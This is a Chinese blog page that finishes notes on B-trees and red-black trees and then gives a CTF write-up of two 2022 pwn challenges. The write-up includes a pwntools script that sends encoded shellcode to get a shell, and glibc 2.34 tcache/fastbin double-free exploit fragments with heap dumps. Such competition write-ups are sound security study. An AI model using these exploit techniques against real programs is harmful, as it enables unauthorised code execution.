<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> &lt;-&gt; <span class="number">39</span> &lt;-&gt; <span class="number">41</span> &lt;-&gt; <span class="number">97</span> </span><br><span class="line">    =&gt; <span class="number">53</span> <span class="comment">/* 新插入 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> &lt;-&gt; <span class="number">39</span> &lt;-&gt; <span class="number">41</span> &lt;-&gt; <span class="number">53</span> &lt;-&gt; <span class="number">97</span> <span class="comment">/* 插入后超过了最大允许的关键字个数4 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">		<span class="number">41</span></span><br><span class="line"><span class="number">22</span> &lt;-&gt; <span class="number">39</span>	<span class="number">53</span> &lt;-&gt; <span class="number">97</span> <span class="comment">/* 以key值为41为中心进行分裂(称为key的子结点) */</span></span><br></pre></td></tr></table></figure>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655433286987-1667461359787.png" class width="1655433286987"> 
<ul>
<li>这个 key 的左子树指向分裂后的左半部分</li>
<li>这个 key 的右子支指向分裂后的右半部分</li>
<li>然后将当前结点指向父结点</li>
</ul>
<p>B树，删除操作：</p>
<p>删除操作是指，根据 key 删除记录，如果B树中的记录中不存对应 key 的记录，则删除失败</p>
<ul>
<li>找到叶节点</li>
<li>如果叶节点中有多于<code>m//2</code>个键，则从节点中删除所需的键</li>
<li>如果叶节点不多于<code>m//2</code>个键，则通过从<code>8</code>个或左兄弟中获取元素来完成键<ul>
<li>如果左侧兄弟包含多于<code>m//2</code>个元素，则将其最大元素推送到其父元素，并将插入元素向下移动到删除键的节点</li>
<li>如果右侧兄弟包含多于<code>m//2</code>个元素，则将其最小元素向上推送到父节点，并将插入元素向下移动到删除键的节点</li>
</ul>
</li>
<li>如果兄弟节点都不包含多于<code>m//2</code>个元素，则通过连接两个叶节点和父节点的插入元素来创建新的叶节点</li>
<li>如果父节点的节点少于<code>m//2</code>，那么也应在父节点上应用上述过程</li>
<li>如果要删除的节点是内部节点，则将节点替换为其有序后继或前一个节点，由于后继或前任将始终位于叶节点上，因此该过程将类似于从叶节点中删除节点</li>
</ul>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655434588426-1667461359787.png" class width="1655434588426"> 
<ul>
<li>总之叶节点不能少于<code>m//2</code>个键</li>
<li>如果少于，则把该父结点以及它的所有子结点 <strong>重新整合</strong> 到其他结点上</li>
</ul>
<h2 id="234树-234"><a href="#234树-234" class="headerlink" title="234树-234"></a>234树-234</h2><p>2-3-4树是4阶的B树，它被称为2-3-4树，因为非叶非根节点的子节点数为 2, 3 或 4，同时，2-3-4树也是红黑树的前身</p>
<p>2-3-4树的特点：</p>
<ul>
<li>它是平衡树</li>
<li>每个节点最多可以存三个数据项</li>
<li>不存在空节点</li>
<li>叶节点可以有数据项没有子节点</li>
<li>插入数据项的时候数据总是插入在叶节点中（这点很重要）</li>
<li>对于非叶节点来说：<ul>
<li>有一个数据项的节点总是有两个子节点</li>
<li>有两个数据项的节点总是有三个子节点</li>
<li>有三个数据项的节点总是有四个子节点</li>
<li>L：表示子节点个数</li>
<li>D：表示数据项个数</li>
<li>针对非叶节点：L = D+1</li>
<li>子节点个数=数据项个数+1</li>
</ul>
</li>
</ul>
<h2 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h2><p>红黑树是对概念模型2-3-4树的一种实现，由于直接进行不同节点间的转化会造成较大的开销，所以选择以二叉树为基础，在二叉树的属性中加入一个 <strong>颜色属性</strong> 来表示2-3-4树中不同的节点</p>
<p>红黑规则：</p>
<ul>
<li>节点不是黑色，就是红色（非黑即红）</li>
<li>根节点为黑色，叶节点为黑色（叶节点是指末梢的空节点 <code>Nil</code>或<code>Null</code>）</li>
<li>一个节点为红色，则其两个子节点必须是黑色的（根到叶子的所有路径，不可能存在两个连续的红色节点）</li>
<li>每个节点到叶子节点的所有路径，都包含相同数目的黑色节点（相同的黑色高度）</li>
</ul>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655522256900-1667461359787.png" class width="1655522256900">  
<ul>
<li>4个规则必须全部符合，就构成了红黑树</li>
</ul>
<p>在插链的过程中，可能会破坏这些规则，这就需要一些机制来恢复平衡</p>
<p>变色：</p>
<ul>
<li>为了重新符合红黑树的规则，尝试把红色节点变为黑色，或者把黑色节点变为红色</li>
</ul>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655523253288-1667461359787.png" class width="1655523253288"> 
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655523267712-1667461359787.png" class width="1655523267712"> 
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655523286624-1667461359787.png" class width="1655523286624"> 
<p>左旋转：</p>
<ul>
<li>左旋转，就是将S点旋转到根节点，S节点的左边都挂到E节点的右边</li>
<li>就是将要旋转的子结点的左边挂到之前节点E的右边</li>
</ul>
<p>右旋转：</p>
<ul>
<li>将要旋转的子结点的右边移到之前结点E的左边</li>
</ul>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/v2-cdcaec3a23aa3aafe534528f80221c04_b-1667461359787.gif" class title="v2-cdcaec3a23aa3aafe534528f80221c04_b"> 
<p>总结：</p>
<img src="/2022/06/18/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%9A%E7%BA%A2%E9%BB%91%E6%A0%91/1655523602992-1667461359787.png" class width="1655523602992"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/10/%E5%9B%BD%E8%B5%9B-%E5%88%9D%E8%B5%9B2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/10/%E5%9B%BD%E8%B5%9B-%E5%88%9D%E8%B5%9B2022/" class="post-title-link" itemprop="url">国赛-初赛2022</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-10 15:26:23" itemprop="dateCreated datePublished" datetime="2022-06-10T15:26:23+08:00">2022-06-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-19 18:01:07" itemprop="dateModified" datetime="2022-12-19T18:01:07+08:00">2022-12-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="login-nomal"><a href="#login-nomal" class="headerlink" title="login-nomal"></a>login-nomal</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.33</span><span class="number">-0u</span>buntu5)</span> release release versio</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">login: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.34</span><span class="number">-0u</span>buntu3_amd64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">776</span>a804f3b57556db703db0581fc8598b3ad85a8, stripped</span><br><span class="line">    </span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>整体的逻辑为：</p>
<ul>
<li>输入 “command : ops”，循环5次（以“\n”进行间隔）</li>
<li>command 有两种命令“opt，msg”，每种对应不同的函数，“ops”为对应的操作数</li>
<li>“msg：ops_m”中的“ops_m”会被放入 Switch-Case 中，用于选择将要执行的函数</li>
<li>“opt：opt_o”中的“opt_o”会被分配内存，然后放入对应的函数作为参数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( key != <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( key2 )</span><br><span class="line">&#123;</span><br><span class="line">  pagesize = getpagesize();                   <span class="comment">// 获取内存分页大小</span></span><br><span class="line">  page = (<span class="keyword">void</span> *)(<span class="keyword">int</span>)mmap((<span class="keyword">void</span> *)<span class="number">0x1000</span>, pagesize, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  opslen = <span class="built_in">strlen</span>(ops);</span><br><span class="line">  <span class="built_in">memcpy</span>(page, ops, opslen);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))page)();                   <span class="comment">// shellcode注入点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>“msg：2”中：有个 shellcode 的注入点，只要两个 key 都为“1”，就可以 getshell</p>
<p>“msg：1”中：如果“ops_m”为“ro0t”，就会设置两个 key 为“1”</p>
<p>攻击脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">cn = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;opt:0\nopt:0\nopt:0\nmsg:ro0tt\nopt:1\n&#x27;&#x27;&#x27;</span></span><br><span class="line">cn.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, payload)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;opt:0\nopt:0\nopt:0\nmsg:&#123;&#125;a\nopt:2\n&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sc)</span><br><span class="line">cn.sendlineafter(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, payload)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>关于 shellcode 的编写：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SmalOSnail/article/details/105236336">手把手教你写纯字符ascii shellcode</a> </li>
</ul>
<h2 id="newest-note"><a href="#newest-note" class="headerlink" title="newest_note"></a>newest_note</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.34</span><span class="number">-0u</span>buntu3)</span> stable release version</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">newest_note: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter ./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=a0f1711c159c5e24913b8711a535fb4268812414, stripped</span><br><span class="line"></span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/exp/newest_note&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  <span class="string">&#x27;./&#x27;</span></span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>2.34-0ubuntu3 在 glibc-all-in-one 里面没有符号表，需要手动下载，在 GDB 中的使用：</p>
<ul>
<li>先用 patchelf 更换 libc 和 ld：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> patchelf ./newest_note --<span class="built_in">set</span>-interpreter ./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> --replace-needed libc.so<span class="number">.6</span> ./libc.so<span class="number">.6</span> --output newest_note1</span><br></pre></td></tr></table></figure>
<ul>
<li>在 GDB 里面使用 set debug-file-directory director：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> debug-file-directory /home/yhellow/tools/debuglibc/<span class="number">2.34</span><span class="number">-0u</span>buntu3/usr/lib/debug/</span><br><span class="line">pwndbg&gt; show debug-file-directory </span><br><span class="line">The directory where separate debug symbols are searched <span class="keyword">for</span> is <span class="string">&quot;/home/yhellow/tools/debuglibc/2.34-0ubuntu3/usr/lib/debug/&quot;</span>.</span><br></pre></td></tr></table></figure>
<p>必须让 GDB 链接符号表，不然 heap 命令没法使用</p>
<p>漏洞分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( chunk_s )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(chunk_s) = key2;                  <span class="comment">// key2 = 0xA</span></span><br><span class="line">  <span class="keyword">if</span> ( key2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)<span class="built_in">list</span>[index]);              <span class="comment">// UAF</span></span><br><span class="line">    LODWORD(chunk_s) = --key2;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>UAF，并且 free 模块只能执行11次</li>
</ul>
<p>入侵思路：</p>
<p>首先高 libc 版本中的 tcache 有 key 保护（一般为 heap_base/tcache_perthread_struct + 0x10），ptmalloc 会在 free tcache-&gt;BK 中写入 key（tcache 只使用 FD/next 进行遍历），如果释放 tcache 时检查到 BK 的位置是 key，就会报错</p>
<p>没有可以绕过 tcache 的手段，所以采用 Double free</p>
<ul>
<li>注意 libc-2.32 以后新加的特性：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* tcache */</span></span><br><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="comment">/* key */</span></span><br><span class="line"><span class="comment">/* fastbin */</span></span><br><span class="line">p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old); <span class="comment">/* p-&gt;head */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过这个特性，来获取 heap_base 和 key</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>) <span class="comment"># key与FD有关,一定要保证后续的chunk-&gt;FD都相同</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">heap_base = leak_addr&lt;&lt;<span class="number">12</span></span><br><span class="line">key = leak_addr</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">success(<span class="string">&quot;key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(key))</span><br></pre></td></tr></table></figure>
<p>接下来我的思路是：利用 Double 来修改 tcache_perthread_struct</p>
<ul>
<li>填满 tcache 需要7次，打 Double free 需要3次，leak libc_base 需要一次</li>
<li>改来改去还是突破不了11次 free 的限制</li>
</ul>
<p><strong>预期解</strong></p>
<p>网上有另一种思路可以把 Double free 压缩到2次：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>) </span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
<p>heap 排布如下：</p>
<ul>
<li>tcache 刚好满</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">7</span>]: <span class="number">0x55f6889144b0</span> —▸ <span class="number">0x55f688914470</span> —▸ <span class="number">0x55f688914430</span> —▸ <span class="number">0x55f6889143f0</span> —▸ <span class="number">0x55f6889143b0</span> —▸ <span class="number">0x55f688914370</span> —▸ <span class="number">0x55f688914330</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>delete(7)：再释放一个 chunk，进入 fastbin</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">7</span>]: <span class="number">0x55f6889144b0</span> —▸ <span class="number">0x55f688914470</span> —▸ <span class="number">0x55f688914430</span> —▸ <span class="number">0x55f6889143f0</span> —▸ <span class="number">0x55f6889143b0</span> —▸ <span class="number">0x55f688914370</span> —▸ <span class="number">0x55f688914330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55f6889144e0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>add(10,’aaaaaaaa’)：从 tcache 中申请一个 chunk</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">6</span>]: <span class="number">0x55f688914470</span> —▸ <span class="number">0x55f688914430</span> —▸ <span class="number">0x55f6889143f0</span> —▸ <span class="number">0x55f6889143b0</span> —▸ <span class="number">0x55f688914370</span> —▸ <span class="number">0x55f688914330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55f6889144e0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>delete(7)：再次释放同一个 chunk，进入 tcache</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">7</span>]: <span class="number">0x55f6889144f0</span> —▸ <span class="number">0x55f688914470</span> —▸ <span class="number">0x55f688914430</span> —▸ <span class="number">0x55f6889143f0</span> —▸ <span class="number">0x55f6889143b0</span> —▸ <span class="number">0x55f688914370</span> —▸ <span class="number">0x55f688914330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55f6889144e0</span> —▸ <span class="number">0x55f688914470</span> ◂— <span class="number">0x55f688914</span></span><br></pre></td></tr></table></figure>
<p>这个有点 House Of Botcake 的味道，利用了 tcachebin 和 fastbin 的独立性，使 chunk 同时存在于 tcache 和 fastbin 中，巧妙的避开了两边的检查</p>
<p>现在我们可以在 fastbin 中伪造一个 tcachebin（申请到 fastbin 时，会把 fastbin 放入 tcachebin），因为第一个 chunk 同时存在于 tcache 和 fastbin，所以我们可以人为制造一些“错位”</p>
<ul>
<li>直接在第一个 chunk 中写入 next chunk+0x20</li>
<li>然后在 next chunk 中写入 next next chunk-0x20</li>
</ul>
<p>下面是网上 leak libc 的 exp 片段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">10</span>,p64(key^(heap_base+<span class="number">0x480</span>))) <span class="comment"># @1</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x440</span>))) <span class="comment"># @2</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x400</span>))) <span class="comment"># @3</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x3a0</span>))) <span class="comment"># @4</span></span><br><span class="line">add(<span class="number">3</span>,p64(key^(heap_base+<span class="number">0x380</span>))) <span class="comment"># @5</span></span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x340</span>))) <span class="comment"># @6</span></span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key)) <span class="comment"># @7</span></span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>) <span class="comment"># @8</span></span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x441</span>)) <span class="comment"># @9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>) </span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x218cc0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base--&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：“@4”和“@5”的反常只是为了后续的利用，和 leak libc_base 的过程无关</li>
</ul>
<p>heap 排列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @0</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">7</span>]: <span class="number">0x55630178c4f0</span> —▸ <span class="number">0x55630178c470</span> —▸ <span class="number">0x55630178c430</span> —▸ <span class="number">0x55630178c3f0</span> —▸ <span class="number">0x55630178c3b0</span> —▸ <span class="number">0x55630178c370</span> —▸ <span class="number">0x55630178c330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55630178c4e0</span> —▸ <span class="number">0x55630178c470</span> ◂— <span class="number">0x55630178c</span></span><br></pre></td></tr></table></figure>
